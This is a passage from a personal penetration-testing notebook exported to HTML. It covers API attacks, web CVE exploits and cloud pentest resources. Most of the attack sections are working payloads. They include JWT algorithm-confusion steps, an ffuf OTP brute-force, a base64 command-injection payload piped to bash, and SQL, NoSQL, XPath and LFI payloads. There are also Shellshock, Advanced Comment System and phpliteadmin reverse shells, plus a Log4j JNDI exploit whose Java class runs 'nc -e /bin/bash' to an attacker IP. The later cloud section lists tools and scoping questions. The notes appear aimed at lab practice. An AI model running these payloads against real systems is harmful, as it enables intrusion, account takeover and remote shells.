/></p><p></p><p><span style="color:#3f4043;">Modify kid value, sub value, and finally sign it with our modified symmetric key.</span></p><p><img src="images/648-2.png" alt="images/648-2.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--JWT_Tokens--Algorithm_Confusion_649.html"></a><h1 class='title level-7'>Algorithm Confusion</h1><br/><p><span style="color:#3f4043;">Go to /jwks.json</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span></p><p>{&quot;kty&quot;:&quot;RSA&quot;,&quot;e&quot;:&quot;AQAB&quot;,&quot;use&quot;:&quot;sig&quot;,&quot;kid&quot;:&quot;210f90e4-b2a3-493d-b3a4-48092adab621&quot;,&quot;alg&quot;:&quot;RS256&quot;,&quot;n&quot;:&quot;2szo0HGPkojlsWE_ueXHOmOuVVZiYv1QyG1Hp79CHfD6Y9rJKbVz49CRWTzofqc_A4LfwaeIDpIA6lTtt7P3haLxIt-ZsWQNEjjhaUi-9gS8jrsVR_hQaT-X4zdlm0n_lVplAfJjMLK43yOcXzACNw-PdIOCXC8XRWfflMkrAvZT_whV5yNSemLyR2S_U_Fr4eHKVCwgo6Vc4nFG0HN_ARFwRzlmkXkQX1tdP-PpBuq58YdYF5tcZRlXcg9aKn3R3Jw1gR7E2RR9EkCdkL5a9JDPpYijui6B1xB7vsGzGYRG1LvbcEkv34MuPGdl4H0zih4Gpu5vPAp5oX-lFgryfw&quot;}</p><p></p><p><span style="color:#3f4043;">Copy the above in that format. </span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Make a new RSA key. Copy paste the above. Then go to PEM section, ctrl a copy.</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">Go to convert all to base64 and copy the base64 output</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><img src="images/649-1.png" alt="images/649-1.png" /></p><p></p><p>New symmetric key. Generate. </p><p></p><p>Change the “k” valeu to the base64 output from last step.</p><p></p><p>Now change the kid value to that of our current user token. save key</p><p></p><p><img src="images/649-2.png" alt="images/649-2.png" /></p><p></p><p>Now change the alg to HS256, and the sub to administrator</p><p></p><p>Then sign the newly created symmetrically signed key</p><p></p><p>that&#39;s it! :) </p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--Improper_Assets_Management_468.html"></a><h1 class='title level-6'>Improper Assets Management</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--Improper_Assets_Management--Bypassing_Rate_Limiting_For_OTP_469.html"></a><h1 class='title level-7'>Bypassing Rate Limiting For OTP</h1><br/><p><span style="color:#3f4043;">This is one way of Bypassing Rate Limiting For OTP through Improper Assets Management.</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">We used someone elses email, pressed forgot password, adn we found this check-otp endpoint. Can we bruteforce the OTP? </span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><img src="images/469-1.png" alt="images/469-1.png" /></p><p></p><p>It seems after 8 requests it refuses to check anymore. Any way around this?</p><p><img src="images/469-2.png" alt="images/469-2.png" /></p><p></p><p>Through Improper Assets Management in this example we can.</p><p><img src="images/469-3.png" alt="images/469-3.png" /></p><p>The web application accepts v2 of the API at this endpoint, and it does not have proper rate limiting set up. As a result we can bruteforce without any prevention.</p><p></p><p>And since burp community is too slow, we&#39;ll be using ffuf.</p><p></p><p>ffuf -u &#39;<a href="http://crapi.apisec.ai:8888/identity/api/auth/v2/check-otp'">http://crapi.apisec.ai:8888/identity/api/auth/v2/check-otp&#39;</a> -d &#39;{&quot;email&quot;:&quot;b@b.com&quot;,&quot;otp&quot;:&quot;FUZZ&quot;,&quot;password&quot;:&quot;IAMAdog1&quot;}&#39; -w userlist.txt -X POST -H &#39;Content-Type:application/json&#39; -fw 5</p><p><img src="images/469-4.png" alt="images/469-4.png" /><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">From here, we can perform Account Takeover with our newly set password. </span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--Mass_Assignment_552.html"></a><h1 class='title level-6'>Mass Assignment</h1><br/><p><span style="color:#3f4043;">When we login we can see admin=false value. We now have an idea of which paramaters the API allows. We can attempt a mass assignment attack with the admin=true in potentially either a login request or a user creation request.</span>  </p><p></p><p><img src="images/552-1.png" alt="images/552-1.png" /></p><p></p><p><span style="color:#3f4043;">Let&#39;s add the admin value</span></p><p><img src="images/552-2.png" alt="images/552-2.png" /></p><p></p><p><span style="color:#3f4043;">As as we intercept the response to our request, our new user is now set up as a admin!</span></p><p><img src="images/552-3.png" alt="images/552-3.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--IDOR_553.html"></a><h1 class='title level-6'>IDOR</h1><br/><p>Insecure direct object references </p><p></p><p>Autorize (Detects some authorization vulnerabilities - Useful for IDOR)</p><p><a href="https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f">https://portswigger.net/bappstore/f9bbac8c4acf4aefa4d7dc92a991af2f</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--API_Command_Injection_481.html"></a><h1 class='title level-6'>API Command Injection</h1><br/><p><img src="images/481-1.png" alt="images/481-1.png" /></p><p></p><p>{</p><p>&quot;target&quot;:&quot;\&quot;;echo cGluZyAtYzIgMTAuMTMuNC4y | base64 -d | bash; \&quot;&quot;</p><p>}</p><p></p><p><img src="images/481-2.png" alt="images/481-2.png" /></p><p></p><p><img src="images/481-3.png" alt="images/481-3.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--API_SQL_INJECTION_548.html"></a><h1 class='title level-6'>API SQL INJECTION</h1><br/><p>{&quot;passphrase&quot;:&quot;465d51506b57487d78567d5d55457379&quot;,&quot;reminder&quot;:&quot;Hiii&#39;&quot;}</p><p></p><p><img src="images/548-1.png" alt="images/548-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--API_NOSQL_INJECTION_549.html"></a><h1 class='title level-6'>API NOSQL INJECTION</h1><br/><p></p><p></p><p></p><p>{&quot;search&quot;:&quot;a&#39;||&#39;a&#39;==&#39;a&quot;}</p><p></p><p></p><p><img src="images/549-1.png" alt="images/549-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--XPATH_INJECTION_550.html"></a><h1 class='title level-6'>XPATH INJECTION</h1><br/><p>&#39;or&#39;1&#39;=&#39;1</p><p>&#39;or&#39;true()&#39;or&#39;</p><p>a&#39; or true() or &#39;</p><p></p><p>&#39; or &#39;1&#39;=&#39;1</p><p>&#39; or &#39;&#39;=&#39;</p><p>x&#39; or 1=1 or &#39;x&#39;=&#39;y</p><p>/</p><p>//</p><p>//*</p><p>*/*</p><p>@*</p><p>count(/child::node())</p><p>x&#39; or name()=&#39;username&#39; or &#39;x&#39;=&#39;y</p><p>&#39; and count(/*)=1 and &#39;1&#39;=&#39;1</p><p>&#39; and count(/@*)=1 and &#39;1&#39;=&#39;1</p><p>&#39; and count(/comment())=1 and &#39;1&#39;=&#39;1</p><p>search=&#39;)] | //user/*[contains(*,&#39;</p><p>search=Har&#39;) and contains(../password,&#39;c</p><p>search=Har&#39;) and starts-with(../password,&#39;c</p><p>&#39; or 1]%00</p><p></p><p></p><p><img src="images/550-1.png" alt="images/550-1.png" /></p><p></p><p>Modified</p><p></p><p><img src="images/550-2.png" alt="images/550-2.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Attacks--API_LFI_551.html"></a><h1 class='title level-6'>API LFI</h1><br/><p></p><p></p><p></p><p>{&quot;filename&quot;:&quot;/../../../../../../../../etc/passwd&quot;}</p><p></p><p></p><p><img src="images/551-1.png" alt="images/551-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--Training_470.html"></a><h1 class='title level-5'>Training</h1><br/><p></p><p></p><p></p><p>TryHackMe</p><p></p><p>Bookstore (free)</p><p>IDOR (paid)</p><p>GraphQL (paid)</p><p> </p><p></p><p>HackTheBox (Retired Machines)</p><p></p><p>Craft</p><p>Postman</p><p>JSON</p><p>Node</p><p>Help</p><p> </p><p></p><p>Github (Vulnerable Apps)</p><p></p><p>Pixi</p><p>REST API Goat</p><p>DVWS-node</p><p>Websheep </p><p><a href="https://github.com/rahulunair/vulnerable-api">https://github.com/rahulunair/vulnerable-api</a></p><p><a href="https://university.apisec.ai/products/apisec-certified-expert/categories/2150251486/posts/2157710632">https://university.apisec.ai/products/apisec-certified-expert/categories/2150251486/posts/2157710632</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Security_Fundamentals_784.html"></a><h1 class='title level-5'>API Security Fundamentals</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Security_Fundamentals--Do's_and_don'ts_797.html"></a><h1 class='title level-6'>Do's and don'ts</h1><br/><p><img src="images/797-1.png" alt="images/797-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Security_Fundamentals--Top_10_examples_785.html"></a><h1 class='title level-6'>Top 10 examples</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Security_Fundamentals--Top_10_examples--1__Broken_Object_Level_Authorization_787.html"></a><h1 class='title level-7'>1 | Broken Object Level Authorization</h1><br/><p><img src="images/787-1.png" alt="images/787-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Security_Fundamentals--Top_10_examples--2__Broken_Authentication_786.html"></a><h1 class='title level-7'>2 | Broken Authentication</h1><br/><p><img src="images/786-1.png" alt="images/786-1.png" /></p></div><div class='page'><a name="ethdology--Enumeration--Initial_Recon--API--API_Security_Fundamentals--Top_10_examples--3__Broken_Object_Property_Level_Authorization_788.html"></a><h1 class='title level-7'>3 | Broken Object Property Level Authorization</h1><br/><p><img src="images/788-1.png" alt="images/788-1.png" /></p><p></p></div><div class='page'><a name="logy--Enumeration--Initial_Recon--API--API_Security_Fundamentals--Top_10_examples--4__Unrestricted_Resource_Consumption_Rate_Limiting_790.html"></a><h1 class='title level-7'>4 | Unrestricted Resource Consumption| Rate Limiting</h1><br/><p><img src="images/790-1.png" alt="images/790-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Security_Fundamentals--Top_10_examples--5__Broken_Function_Level_Authorization_791.html"></a><h1 class='title level-7'>5 | Broken Function Level Authorization</h1><br/><p><img src="images/791-1.png" alt="images/791-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Security_Fundamentals--Top_10_examples--6__Server-Side_Resource_Forgery_792.html"></a><h1 class='title level-7'>6 | Server-Side Resource Forgery</h1><br/><p><img src="images/792-1.png" alt="images/792-1.png" /></p><p></p><p> </p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Security_Fundamentals--Top_10_examples--7__Security_Misconfigurations_793.html"></a><h1 class='title level-7'>7 | Security Misconfigurations</h1><br/><p><img src="images/793-1.png" alt="images/793-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Security_Fundamentals--Top_10_examples--8__Lack_of_Protection_frin_Automated_Threats_794.html"></a><h1 class='title level-7'>8 | Lack of Protection frin Automated Threats</h1><br/><p><img src="images/794-1.png" alt="images/794-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Security_Fundamentals--Top_10_examples--9__Improper_Inventory_Management_795.html"></a><h1 class='title level-7'>9 | Improper Inventory Management</h1><br/><p><img src="images/795-1.png" alt="images/795-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--API--API_Security_Fundamentals--Top_10_examples--10__Unsafe_Consumption_of_APIs_796.html"></a><h1 class='title level-7'>10 | Unsafe Consumption of APIs</h1><br/><p><img src="images/796-1.png" alt="images/796-1.png" /></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Web_CVEs_275.html"></a><h1 class='title level-4'>Web CVEs</h1><br/></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Web_CVEs--Webmin-Minisrv_0.1_-_1.290_274.html"></a><h1 class='title level-5'>Webmin/Minisrv 0.1 - 1.290</h1><br/><p><a href="https://github.com/IvanGlinkin/CVE-2006-3392/blob/main/CVE-2006-3392.sh">https://github.com/IvanGlinkin/CVE-2006-3392/blob/main/CVE-2006-3392.sh</a></p><p></p><p>edit the host and mby port</p><p></p><p>then</p><p></p><p><img src="images/274-1.png" alt="images/274-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Web_CVEs--Shellshock_218.html"></a><h1 class='title level-5'>Shellshock</h1><br/><p><a href="https://www.exploit-db.com/docs/48112">https://www.exploit-db.com/docs/48112</a></p><p></p><p><span style="color:#3f4043;">When you see cgi-bin from a directory scan, Shellshock might be your way in.</span></p><p></p><p></p><p><span style="color:#3f4043;">In User-Agent: </span>() { :;}; /bin/bash -c ‘nc 192.168.234.166 1337 -e /bin/sh’</p><p></p><p>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -u <a href="http://192.168.1.48">http://192.168.1.48</a></p><p></p><p>From symfonos3, vulnhub</p><p>(nc version did not work, but bash did)</p><p></p><p>User-Agent: () { :;}; /bin/bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.1.42/443 &lt;&amp;1&#39;</p><p></p><p><img src="images/218-1.png" alt="images/218-1.png" /></p><p></p><p>we get a shell ; )</p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Web_CVEs--Advanced_Comment_System_1.1_307.html"></a><h1 class='title level-5'>Advanced Comment System 1.1</h1><br/><p><a href="https://memoryhackers.org/konular/advanced-comment-system-1-0-remote-command-execution-exploit.221924/">https://memoryhackers.org/konular/advanced-comment-system-1-0-remote-command-execution-exploit.221924/</a></p><p></p><p>Modify url in script to your target. Be mindful of firewall rules on reverse shell.</p><p></p><p>python3 acs.py &#39;bash -i &gt;&amp; /dev/tcp/192.168.119.199/443 0&gt;&amp;1&#39;</p><p></p><p><img src="images/307-1.png" alt="images/307-1.png" /> </p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Web_CVEs--Phpliteadmin_1.9.3_318.html"></a><h1 class='title level-5'>Phpliteadmin 1.9.3</h1><br/><p><a href="https://github.com/F-Masood/PHPLiteAdmin-1.9.3---Exploit-PoC">https://github.com/F-Masood/PHPLiteAdmin-1.9.3---Exploit-PoC</a></p><p><span style="color:#3f4043;">phpliteadmin exploit with lfi to revshell</span></p><p></p><p></p><p><span style="color:#3f4043;">Follow this, but test with both text and string, and adjust the url potentially. </span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;">In this particular case, the way to trigger the malicous file you created through phpliteadmin, was through Cuppa CMS like so:</span></p><p><a href="http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../usr/local/databases/poc.php">http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../usr/local/databases/poc.php</a></p><p></p><p><span style="color:#3f4043;">and reverse shell, like so:  </span></p><p><a href="http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../usr/local/databases/poc.php&cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.119.199%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27">http://10.11.1.116/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../usr/local/databases/poc.php&amp;cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.119.199%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22/bin/bash%22)%27</a></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--Web_CVEs--Log4j_374.html"></a><h1 class='title level-5'>Log4j</h1><br/><p></p><p><span style="color:#3f4043;">Install and setup:</span></p><p></p><p>git clone <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></p><p></p><p>cd marshalsec</p><p>sudo apt install maven -y </p><p></p><p>mvn clean package -DskipTests </p><p></p><p>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;<a href="http://10.13.31.108:8000/#Exploit.class">http://10.13.31.108:80/#Exploit.class</a>&quot;</p><p></p><p>python3 -m http.server 80</p><p></p><p><span style="color:#3f4043;">Next, create and compile payload:</span> <span style="color:#3f4043;">(just basic example payload:)</span><span style="color:#3f4043;"></span></p><p><span style="color:#3f4043;"></span></p><p>gedit Exploit.java</p><p></p><p><span style="color:#ed333b;">public class Exploit {</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">    static {</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">        try {</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">            java.lang.Runtime.getRuntime().exec(&quot;nc -e /bin/bash 10.13.31.108 443&quot;);</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">        } catch (Exception e) {</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">            e.printStackTrace();</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">        }</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">    }</span><span style="color:#ed333b;"></span></p><p><span style="color:#ed333b;">}</span></p><p></p><p>javac Exploit.java -source 8 -target 8</p><p><span style="color:#3f4043;">or</span></p><p>javac Exploit.java</p><p></p><p><span style="color:#3f4043;">setup listener:</span></p><p>rlwrap nc -lvnp 443</p><p></p><p><span style="color:#3f4043;">Trigger payload: </span></p><p>curl &#39;<a href="http://10.10.14.76:8983/solr/admin/cores?foo=$">http://10.10.14.76:8983/solr/admin/cores?foo=$</a>\{jndi:ldap://10.13.31.108:1389/Exploit\}&#39;</p><p></p><p><img src="images/374-1.png" alt="images/374-1.png" /></p></div><div class='page'><a name="Methdology--Enumeration--Initial_Recon--WAF_bypass_206.html"></a><h1 class='title level-4'>WAF bypass</h1><br/><p><a href="https://youtu.be/Oh1SU9kY88A">https://youtu.be/Oh1SU9kY88A</a></p><p></p><p><span style="color:#3f4043;">WAF fingerprinting:</span></p><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p></p><p><span style="color:#3f4043;">File Upload Bypass:</span></p><p><a href="https://www.onsecurity.io/blog/file-upload-checklist/">https://www.onsecurity.io/blog/file-upload-checklist/</a></p></div><div class='page'><a name="Methdology--Enumeration--Cloud_510.html"></a><h1 class='title level-3'>Cloud</h1><br/><p>Learning Resources:</p><p></p><p>Cloud:</p><p><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology">https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology</a></p><p><a href="https://www.getsecureworld.com/blog/best-tools-for-cloud-penetration-testing/">https://www.getsecureworld.com/blog/best-tools-for-cloud-penetration-testing/</a></p><p><a href="https://www.getastra.com/blog/security-audit/cloud-penetration-testing/">https://www.getastra.com/blog/security-audit/cloud-penetration-testing/</a></p><p></p><p>Learning playlists:</p><p><a href="https://www.youtube.com/watch?v=ffBcIkjumBc&list=PLfQxJ109X71-Vvnrlp4BIO-v17it_KFSX&index=1">https://www.youtube.com/watch?v=ffBcIkjumBc&amp;list=PLfQxJ109X71-Vvnrlp4BIO-v17it_KFSX&amp;index=1</a></p><p><a href="https://youtu.be/fiSJQfiS21c?t=4838">https://youtu.be/fiSJQfiS21c?t=4838</a></p><p><a href="https://www.youtube.com/watch?v=aqumgrSBDM4">https://www.youtube.com/watch?v=aqumgrSBDM4</a></p><p><a href="https://www.youtube.com/watch?v=lOhvIooWzOg">https://www.youtube.com/watch?v=lOhvIooWzOg</a></p><p><a href="https://m.youtube.com/watch?v=njsNy2bNuT8">https://m.youtube.com/watch?v=njsNy2bNuT8</a></p><p><a href="https://www.youtube.com/playlist?list=PLaF-mVL3srXy4qhzqfPozYzIs4Rq-oNKI">https://www.youtube.com/playlist?list=PLaF-mVL3srXy4qhzqfPozYzIs4Rq-oNKI</a></p><p><a href="https://www.youtube.com/watch?v=na3xYFzZQ3s&t=251s">https://www.youtube.com/watch?v=na3xYFzZQ3s&amp;t=251s</a></p><p><a href="https://www.youtube.com/watch?v=G9z6HOTV0Hg&t=195s">https://www.youtube.com/watch?v=G9z6HOTV0Hg&amp;t=195s</a></p><p><a href="https://www.youtube.com/watch?v=i8lG5HGzMZ8">https://www.youtube.com/watch?v=i8lG5HGzMZ8</a></p><p><a href="https://www.youtube.com/watch?v=zap0ov5uTxs&list=PLGsELqvei1dbQO3bBLpsD5MwiBo-U_zxh">https://www.youtube.com/watch?v=zap0ov5uTxs&amp;list=PLGsELqvei1dbQO3bBLpsD5MwiBo-U_zxh</a></p><p></p><p>Tools:</p><p><a href="https://github.com/nahamsec/lazys3">https://github.com/nahamsec/lazys3</a> (find s3 buckets)</p><p><a href="https://github.com/trufflesecurity/trufflehog">https://github.com/trufflesecurity/trufflehog</a> (truffleHog, finds leaked keys and credentials across github)</p><p><a href="https://github.com/RhinoSecurityLabs/pacu">https://github.com/RhinoSecurityLabs/pacu</a> (enum and exploitation framework, think msf)</p><p><a href="https://github.com/prowler-cloud/prowler">https://github.com/prowler-cloud/prowler</a> (checks for many misconfigurations)</p><p><a href="https://github.com/salesforce/cloudsplaining">https://github.com/salesforce/cloudsplaining</a> (useful for privilege escalation)</p><p><a href="https://github.com/WithSecureLabs/awspx">https://github.com/WithSecureLabs/awspx</a>  (graphing like bloodhound, useful for privilege escalation. check effective admin and inbound paths)</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--OWASP_Cloud_Top_10_587.html"></a><h1 class='title level-4'>OWASP Cloud Top 10</h1><br/><p><a href="https://owasp.org/www-project-cloud-native-application-security-top-10/">https://owasp.org/www-project-cloud-native-application-security-top-10/</a></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--AWS_511.html"></a><h1 class='title level-4'>AWS</h1><br/><p><h3>can you quickly explain the most important components of AWS are from the POV of a pentester?</h3></p><p><ol><li>AWS Identity and Access Management (IAM) - This service allows you to manage users and their access to resources within your AWS account. It&#39;s important to secure access to your IAM resources, as they control who can access other resources within your AWS account.</li></ol></p><p><ol><li>Amazon Elastic Compute Cloud (EC2) - EC2 is a core component of AWS, allowing you to launch virtual servers in the cloud. These servers can be used to host websites, applications, and other resources. It&#39;s important to secure access to your EC2 instances and ensure that they are properly configured to prevent unauthorized access.</li></ol></p><p><ol><li>Amazon Simple Storage Service (S3) - S3 is a scalable, high-speed storage service that can be used to store a wide variety of data types. It&#39;s important to properly secure access to your S3 buckets and ensure that they are configured with the appropriate access controls.</li></ol></p><p><ol><li>Amazon Relational Database Service (RDS) - RDS is a managed database service that makes it easy to set up, operate, and scale a relational database in the cloud. It&#39;s important to secure access to your RDS databases and ensure that they are properly configured to prevent unauthorized access.</li></ol></p><p><ol><li>AWS Virtual Private Cloud (VPC) - VPC allows you to create a virtual network in the cloud, where you can launch resources in a logically isolated area. It&#39;s important to secure access to your VPC and ensure that it is properly configured to prevent unauthorized access to your resources.</li></ol></p><p></p><p></p><p></p><p>Cheat sheets:</p><p><a href="https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/AWS.md">https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/AWS.md</a></p><p></p><p><a href="https://www.youtube.com/watch?v=u_3cV0pzptY&t=881s">https://www.youtube.com/watch?v=u_3cV0pzptY&amp;t=881s</a></p><p></p><p><h3>As a pentester, you&#39;ll likely be interested in the following AWS services:</h3><ol><li>Elastic Compute Cloud (EC2): Allows users to rent virtual computers on which to run their own computer applications.</li></ol></p><p><ol><li>Simple Storage Service (S3): Object storage with a simple web service interface.</li></ol></p><p><ol><li>Identity and Access Management (IAM): Allows you to manage access to AWS services and resources securely.</li></ol></p><p><ol><li>Virtual Private Cloud (VPC): Virtual networking environment.</li></ol></p><p><ol><li>Elastic Block Store (EBS): Block storage volumes for use with EC2 instances.</li></ol></p><p><ol><li>CloudTrail: It helps to monitor the user activity and API usage.</li></ol></p><p></p><p><h3>Yes, Kubernetes (often shortened to &quot;K8s&quot;) is often used with Amazon Elastic Compute Cloud (EC2).</h3><h3></h3></p><p><h3>Yes, it is becoming more common for web applications to be deployed using containers. </h3><h3></h3></p><p><h3>The 2 most popular contain solutions are dockerer and kubernetes.</h3><span style="color:#3f4043;"> Docker within kubernetes most common solution</span></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--AWS--Scoping-Client_Discussion_570.html"></a><h1 class='title level-5'>Scoping/Client Discussion</h1><br/><p><ul><li>Are you using multiple AWS accounts for this environment?</li><li>How many?</li><li>Are you interested in having them all tested, or just a portion?</li><li>What kind of access will be provided to the environment?</li><li>What/how many AWS services are you using?</li><li>How many regions do your resources span across?</li><li>How many EC2 instances/Lambda functions are in use?</li><li>How many IAM users, roles, and groups do you have?</li><li>How do your users access your environment? (regular IAM users, SSO |</li><li>AssumeRole, and so on)</li></ul></p><p></p><p><ul><li>Is this a red team style engagement where our activity will be actively monitored and defended against by a blue team? </li><li>Is this just an audit of configuration? </li><li>Is this a go as far as possible type of engagement without an activate defense against us?</li></ul></p><p></p><p></p><p>Beyond that, is the client supplying us credentials? If so, credentials for how many users</p><p>and what information do we get about them? If not, should we be social engineering to gain</p><p>access?</p><p></p><p></p><p>Other important questions may include the following:<ul><li>Is this a test/development/production environment?</li><li>Is there anything we should not touch in the environment?</li><li>Are there other users who are actively using this environment?</li></ul></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--AWS--Enumeration_512.html"></a><h1 class='title level-5'>Enumeration</h1><br/><p>nslookup flaws.cloud</p><p></p><p>hostname 52.218.228.122</p><p></p><p>aws s3 ls s3://flaws.cloud --region us-west-2 --no-sign-request</p><p> <img src="images/512-1.png" alt="images/512-1.png" /></p><p> </p><p>curl flaws.cloud.s3.amazonaws.com | xmllint -format</p><p>curl flaws.cloud.s3.amazonaws.com | xmllint -format -</p><p></p><p></p><p>mkdir .aws</p><p>gedit .aws/credentials</p><p><img src="images/512-2.png" alt="images/512-2.png" /></p><p></p><p><span style="color:#3f4043;">If you find credentials, make account and see account properties:</span></p><p>aws configure --profile havoc</p><p>aws --profile havoc sts get-caller-identity</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--AWS--Enumeration--scanning_cloud_ranges_583.html"></a><h1 class='title level-6'>scanning cloud ranges</h1><br/><p><a href="https://sansorg.egnyte.com/dl/pudbaSq8aA/CloudScanningforVulnerabilityDiscovery.pdf_">https://sansorg.egnyte.com/dl/pudbaSq8aA/CloudScanningforVulnerabilityDiscovery.pdf_</a></p><p></p><p><a href="https://www.sans.org/blog/cloud-scanning-vulnerability-discovery/">https://www.sans.org/blog/cloud-scanning-vulnerability-discovery/</a></p><p><a href="https://www.youtube.com/watch?v=Izy9APT5e7I">https://www.youtube.com/watch?v=Izy9APT5e7I</a><h3> (cloud scanning sans) </h3></p><p></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--AWS--Enumeration--S3_Buckets_513.html"></a><h1 class='title level-6'>S3 Buckets</h1><br/><p><a href="https://github.com/nahamsec/lazys3">https://github.com/nahamsec/lazys3</a> (find s3 buckets)</p></div><div class='page'><a name="Methdology--Enumeration--Cloud--AWS--Enumeration--Leaked_Credentials_514.html"></a><h1 class='title level-6'>Leaked Credentials</h1><br/><p><a href="https://github.com/trufflesecurity/trufflehog">https://github.com/trufflesecurity/trufflehog</a> (truffleHog, finds leaked keys and credentials across github)</p></div><div class='page'><a name="Methdology--Enumeration--Cloud--AWS--Privilege_Escalation_515.html"></a><h1 class='title level-5'>Privilege Escalation</h1><br/><p><a href="https://github.com/salesforce/cloudsplaining">https://github.com/salesforce/cloudsplaining</a> (useful for privilege escalation)</p><p><a href="https://github.com/WithSecureLabs/awspx">https://github.com/WithSecureLabs/awspx</a>  (graphing like bloodhound, useful for privilege escalation. check effective admin and inbound paths)</p><p></p></div><div class='page'><a name="Methdology--Enumeration--Cloud--Azure_562.html"></a><h1 class='title level-4'>Azure</h1><br/><p><h3>can you quickly explain the most important components of Azure are from the POV of a pentester?</h3></p><p><ol><li>Azure Active Directory (AD) - This service allows you to manage users and their access to resources within your Azure account. It&#39;s important to secure access to your Azure AD resources, as they control who can access other resources within your Azure account.</li></ol></p><p><ol><li>Azure Virtual Machines (VMs) - VMs are a core component of Azure, allowing you to launch virtual servers in the cloud. These servers can be used to host websites, applications, and other resources. It&#39;s important to secure access to your VMs and ensure that they are properly configured to prevent unauthorized access.</li></ol></p><p><ol><li>Azure Storage - Azure provides a variety of storage services, including blobs (binary large objects), files, and tables. It&#39;s important to properly secure access to your Azure Storage resources and ensure that they are configured with the appropriate access controls.</li></ol></p><p><ol><li>Azure SQL Database - This is a managed database service that makes it easy to set up, operate, and scale a SQL database in the cloud. It&#39;s important to secure access to your Azure SQL databases and ensure that they are properly configured to prevent unauthorized access.</li></ol></p><p><ol><li>Azure 